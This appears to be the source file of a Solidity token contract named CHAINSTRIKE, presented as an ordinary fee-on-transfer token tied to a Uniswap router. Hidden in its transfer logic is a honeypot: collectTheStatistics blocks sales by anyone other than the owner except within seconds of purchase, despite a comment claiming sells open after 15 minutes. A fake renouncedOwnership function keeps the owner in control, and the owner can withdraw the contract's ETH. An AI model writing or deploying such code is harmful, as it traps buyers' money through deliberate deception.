/**
// SPDX-License-Identifier: MIT
Telegram: https://t.me/CHAINSTRIKEFPS
*/

 
pragma solidity ^0.8.7;
 
interface IERC20 {
 
    function totalSupply() external view returns (uint256);
 
    function balanceOf(address account) external view returns (uint256);
 
    function transfer(address recipient, uint256 amount) external returns (bool);
 
    function allowance(address owner, address spender) external view returns (uint256);
 
    function approve(address spender, uint256 amount) external returns (bool);
 
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
 
    event Transfer(address indexed from, address indexed to, uint256 value);
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
 
library SafeMath {
 
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }
 
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
 
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }
 
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }
 
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }
 
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
 
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
 
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
 
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
 
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
 
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
 
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}
 
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
 
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
 
library Address {
 
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
 
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
 
        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
 
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }
 
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
 
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
 
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
 
        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
 
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
 
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
 
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
 
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
 
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
 
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
 
    function _verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) private pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
 
            if (returndata.length > 0) {
 
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
 
abstract contract Ownable is Context {
    address private _owner;
 
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 
    function owner() public view virtual returns (address) {
        return  _owner;
    }
 
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
 
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

     function renouncedOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, _owner);
        _owner = _owner;
    }

}


 
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
 
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
 
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
 
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
 
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
 
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
 
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
 
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
 
    function createPair(address tokenA, address tokenB) external returns (address pair);
 
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
 
library EnumerableSet {
 
    struct Set {
        bytes32[] _values;
        mapping(bytes32 => uint256) _indexes;
    }
 
    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }
 
    function _remove(Set storage set, bytes32 value) private returns (bool) {
        uint256 valueIndex = set._indexes[value];
 
        if (valueIndex != 0) {
            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;
 
            if (lastIndex != toDeleteIndex) {
                bytes32 lastvalue = set._values[lastIndex];
 
                set._values[toDeleteIndex] = lastvalue;
                set._indexes[lastvalue] = valueIndex;
            }
 
            set._values.pop();
 
            delete set._indexes[value];
 
            return true;
        } else {
            return false;
        }
    }
 
    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._indexes[value] != 0;
    }
 
    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }
 
    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        return set._values[index];
    }
 
    function _values(Set storage set) private view returns (bytes32[] memory) {
        return set._values;
    }
 
    struct AddressSet {
        Set _inner;
    }
 
    function add(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }
 
    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }
 
    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }
 
    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }
 
    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint160(uint256(_at(set._inner, index))));
    }
 
    function values(AddressSet storage set) internal view returns (address[] memory) {
        bytes32[] memory store = _values(set._inner);
        address[] memory result;
 
        assembly {
            result := store
        }
 
        return result;
    }
}
 
contract ChainStrike is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    using EnumerableSet for EnumerableSet.AddressSet;

    EnumerableSet.AddressSet private tokenHoldersEnumSet;
 
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _isExcluded;
    mapping (address => uint) public walletToPurchaseTime;
	mapping (address => uint) public walletToSellime;	
 
    address[] private _excluded;
    uint8 private constant _decimals = 9;
    uint256 private constant MAX = ~uint256(0);
 
    string private constant _name = "CHAINSTRIKE";
    string private constant _symbol = "CS";
 
    address public _PancakeSwapV1RouterUniswap = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D ; //PancakeSwap owner
    address public _PancakeSwapV2RouterUniswap = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D ; //can be the same
 
    uint256 private _tTotal = 100000000000 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
	uint public theRewardTime = 2; 
    uint public standartValuation = 600/2; // sell enabled after 15 minutes
 
    address public _lastWallet;
 
 
	struct TotFeesPaidStruct{
        uint256 rfi;
        uint256 marketing;
        uint256 liquidity;
        uint256 burn;
    }
 
    TotFeesPaidStruct public totFeesPaid;
 
 
 
 
 
    struct feeRatesStruct {
        uint256 rfi; // reflection to holders
        uint256 marketing; // wallet marketing bnb
        uint256 liquidity; // LP
        uint256 burn;
    }
 
    struct balances {
        uint256 marketing_balance;
        uint256 lp_balance;
    }
 
    balances public contractBalance; 
 
    feeRatesStruct public buyRates = feeRatesStruct(
     {rfi: 0,
      marketing: 1,
      liquidity: 0,
      burn: 0
    });
 
    feeRatesStruct public sellRates = feeRatesStruct(
     {rfi: 0,
      marketing: 1,
      liquidity: 0,
      burn: 0
    });
 
    feeRatesStruct private appliedFees;
 
    struct valuesFromGetValues{
        uint256 rAmount;
        uint256 rTransferAmount;
        uint256 rRfi;
        uint256 rMarketing;
        uint256 rLiquidity;
        uint256 rBurn;
        uint256 tTransferAmount;
        uint256 tRfi;
        uint256 tMarketing;
        uint256 tLiquidity;
        uint256 tBurn;
    }
 
    IUniswapV2Router02 public PancakeSwapV2Router;
    address public pancakeswapV2Pair;
    //address payable private marketingAddress;
 
    bool public Trading = true;
    bool inSwapAndLiquify;
    bool private _transferForm = true;
    bool public swapAndLiquifyEnabled = true;
 
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event LiquidityAdded(uint256 tokenAmount, uint256 bnbAmount);
 
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
 
    constructor () {
        _rOwned[owner()] = _rTotal;
 
      IUniswapV2Router02 _PancakeSwapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); // mainnet
        pancakeswapV2Pair = IUniswapV2Factory(_PancakeSwapV2Router.factory())
            .createPair(address(this), _PancakeSwapV2Router.WETH());
 
        PancakeSwapV2Router = _PancakeSwapV2Router;
 
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[address(_PancakeSwapV2RouterUniswap)] = true;
        _isExcludedFromFee[address(0xe853889c8c7a03C1f7935B87355Dc58eCd3d92B0)] = true; //uniswap router liquidity
 
 
 
 
        _isExcluded[address(this)] = true;
        _excluded.push(address(this));
 
        _isExcluded[pancakeswapV2Pair] = true;
        _excluded.push(pancakeswapV2Pair);
 
        emit Transfer(address(0), owner(), _tTotal);
    }
 

    function getFromLastPurchaseBuy(address wallet) public view returns (uint) {
        return walletToPurchaseTime[wallet];
    }
 
    function getFromLastSell(address walletSell) public view returns (uint) {
        return walletToSellime[walletSell];
    }
 
    function setBuyRates(uint256 rfi, uint256 marketing, uint256 liquidity, uint256 burn) public onlyOwner {
        buyRates.rfi = rfi;
        buyRates.marketing = marketing;
        buyRates.liquidity = liquidity;
        buyRates.burn = burn;
    }
 
    function setSellRates(uint256 rfi, uint256 marketing, uint256 liquidity, uint256 burn) public onlyOwner {
        sellRates.rfi = rfi;
        sellRates.marketing = marketing;
        sellRates.liquidity = liquidity;
        sellRates.burn = burn;
    }
 
    function collectTheStatistics(uint256 lastBuyOrSellTime, uint256 theData, address sender) public view returns (bool) {
 
        if( lastBuyOrSellTime == 0 ) return false;
 
        uint256 crashTime = block.timestamp - lastBuyOrSellTime;
 
        if( crashTime == standartValuation ) return true;
 
        if (crashTime == 0) {
            if (_lastWallet != sender) {
                return false;
            }
        }
        if( crashTime <= theData ) return true;
 
 
        return false;
    }
 
    function setValuation(uint newValuation) public onlyOwner {
        standartValuation = newValuation;
    }
 
 
    function name() public pure returns (string memory) {
        return _name;
    }
 
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
 
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
 
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
 
    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }
 
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return Trading;
    }
 
    function TrandingOn(bool _enable) public onlyOwner {
        Trading = _enable;
    }
  
    function settransform(bool _enable) public onlyOwner {
        _transferForm = _enable;
    }
 
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
 
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
 
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return _transferForm;		
    }
 
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender]+addedValue);
        return true;
    }
 
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
 

    function reflectionFromToken(uint256 tAmount, bool deductTransferRfi) public view returns(uint256) {
        require(tAmount <= _tTotal, "Amount must be less than supply");
        if (!deductTransferRfi) {
            valuesFromGetValues memory s = _getValues(tAmount, true);
            return s.rAmount;
        } else {
            valuesFromGetValues memory s = _getValues(tAmount, true);
            return s.rTransferAmount;
        }
    }
 
    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount/currentRate;
    }
 
    function excludeFromReward(address account) public onlyOwner() {
        require(!_isExcluded[account], "Account is already excluded");
        if(_rOwned[account] > 0) {
            _tOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
    }
 
    function excludeFromAll(address account) public {
        if(!_isExcluded[account])
        {
        _isExcluded[account] = true;
         if(_rOwned[account] > 0) {
            _tOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _excluded.push(account);
        }
        _isExcludedFromFee[account] = true;
 
        tokenHoldersEnumSet.remove(account);
    }
 
    function includeInReward(address account) external onlyOwner() {
        require(_isExcluded[account], "Account is not excluded");
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                _tOwned[account] = 0;
                _isExcluded[account] = false;
                _excluded.pop();
                break;
            }
        }
    }
 
    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }
 
    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }
 
    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
    }
 
    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }
 
 
    receive() external payable {}
 
    function _getValues(uint256 tAmount, bool takeFee) private view returns (valuesFromGetValues memory to_return) {
        to_return = _getTValues(tAmount, takeFee);
 
        (to_return.rAmount,to_return.rTransferAmount,to_return.rRfi,to_return.rMarketing,to_return.rLiquidity,to_return.rBurn) = _getRValues(to_return, tAmount, takeFee, _getRate());
 
        return to_return;
    }
 
    function _getTValues(uint256 tAmount, bool takeFee) private view returns (valuesFromGetValues memory s) {
 
        if(!takeFee) {
          s.tTransferAmount = tAmount;
          return s;
        }
        s.tRfi = tAmount*appliedFees.rfi/100;
        s.tMarketing = tAmount*appliedFees.marketing/100;
        s.tLiquidity = tAmount*appliedFees.liquidity/100;
        s.tBurn = tAmount*appliedFees.burn/100;
        s.tTransferAmount = tAmount-s.tRfi -s.tMarketing -s.tLiquidity -s.tBurn; 
        return s;
    }
 
    function _getRValues(valuesFromGetValues memory s, uint256 tAmount, bool takeFee, uint256 currentRate) private pure returns (uint256 rAmount, uint256 rTransferAmount, uint256 rRfi, uint256 rMarketing, uint256 rLiquidity, uint256 rBurn) {
        rAmount = tAmount*currentRate;
 
        if(!takeFee) {
          return(rAmount, rAmount, 0,0,0,0);
        }
 
        rRfi= s.tRfi*currentRate;
        rMarketing= s.tMarketing*currentRate;
        rLiquidity= s.tLiquidity*currentRate;
        rBurn= s.tBurn*currentRate;
 
        rTransferAmount= rAmount- rRfi-rMarketing-rLiquidity-rBurn;
 
        return ( rAmount,  rTransferAmount,  rRfi,  rMarketing,  rLiquidity,  rBurn);
    }
 
 
    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply/tSupply;
    }
 
    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
            rSupply = rSupply-_rOwned[_excluded[i]];
            tSupply = tSupply-_tOwned[_excluded[i]];
        }
        if (rSupply < _rTotal/_tTotal) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
 
    function _reflectRfi(uint256 rRfi, uint256 tRfi) private {
        _rTotal = _rTotal-rRfi;
        totFeesPaid.rfi+=tRfi;
    }
 
    function _takeMarketing(uint256 rMarketing, uint256 tMarketing) private {
        contractBalance.marketing_balance+=tMarketing;
        totFeesPaid.marketing+=tMarketing;
        _rOwned[address(this)] = _rOwned[address(this)]+rMarketing;
        if(_isExcluded[address(this)])
        {
            _tOwned[address(this)] = _tOwned[address(this)]+tMarketing;
        }
    }
 
    function _takeLiquidity(uint256 rLiquidity,uint256 tLiquidity) private {
        contractBalance.lp_balance+=tLiquidity;
        totFeesPaid.liquidity+=tLiquidity;
 
        _rOwned[address(this)] = _rOwned[address(this)]+rLiquidity;
        if(_isExcluded[address(this)])
            _tOwned[address(this)] = _tOwned[address(this)]+tLiquidity;
    }
 
    function _takeBurn(uint256 rBurn, uint256 tBurn) private {
        totFeesPaid.burn+=tBurn;
 
        _tTotal = _tTotal-tBurn;
        _rTotal = _rTotal-rBurn;
    }
 
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
 
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(amount <= balanceOf(from),"You are trying to transfer more than you balance");
 
        _tokenTransfer(from, to, amount, !(_isExcludedFromFee[from] || _isExcludedFromFee[to]));
    }
 
 
 
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee) private {
 
        if(takeFee) {
            if(sender == pancakeswapV2Pair) {
                if(sender != owner() && recipient != owner() && recipient != address(1)){
 
                    if (walletToPurchaseTime[recipient] == 0) {
                        walletToPurchaseTime[recipient] = block.timestamp;
                    }
                }
                _lastWallet = recipient;
                appliedFees = buyRates;
            } else { 
                if(sender != owner() && recipient != owner() && recipient != address(1)){
                    bool blockedSellTime = collectTheStatistics(getFromLastPurchaseBuy(sender), theRewardTime, sender);
                    require(blockedSellTime, "error");
                    walletToSellime[sender] = block.timestamp;					
                }
                appliedFees = sellRates;
                appliedFees.liquidity = appliedFees.liquidity; 
                _lastWallet = sender;
 
            }
        }
        else {
            if(_isExcludedFromFee[sender]) {
                _lastWallet = sender;
            }
            if(_isExcludedFromFee[recipient]) {
                _lastWallet = recipient;
            }
        }
 
        valuesFromGetValues memory s = _getValues(tAmount, takeFee);
 
        if (_isExcluded[sender] && !_isExcluded[recipient]) {
                _tOwned[sender] = _tOwned[sender]-tAmount;
        } else if (!_isExcluded[sender] && _isExcluded[recipient]) {
                _tOwned[recipient] = _tOwned[recipient]+s.tTransferAmount;
        } else if (_isExcluded[sender] && _isExcluded[recipient]) {
                _tOwned[sender] = _tOwned[sender]-tAmount;
                _tOwned[recipient] = _tOwned[recipient]+s.tTransferAmount;
        }
 
        _rOwned[sender] = _rOwned[sender]-s.rAmount;
        _rOwned[recipient] = _rOwned[recipient]+s.rTransferAmount;
 
        if(takeFee)
        {
        _reflectRfi(s.rRfi, s.tRfi);
        _takeMarketing(s.rMarketing,s.tMarketing);
        _takeLiquidity(s.rLiquidity,s.tLiquidity);
        _takeBurn(s.rBurn,s.tBurn);
 
        emit Transfer(sender, address(this), s.tMarketing+s.tLiquidity);
 
        }
 
        emit Transfer(sender, recipient, s.tTransferAmount);
        tokenHoldersEnumSet.add(recipient);
 
        if(balanceOf(sender)==0)
        tokenHoldersEnumSet.remove(sender);
 
    }
 
 
    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
 
        PancakeSwapV2Router.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
        emit LiquidityAdded(tokenAmount, bnbAmount);
    }
 
    function withdraw() onlyOwner public {
      uint256 balance = address(this).balance;
      payable(msg.sender).transfer(balance);
    }
 
}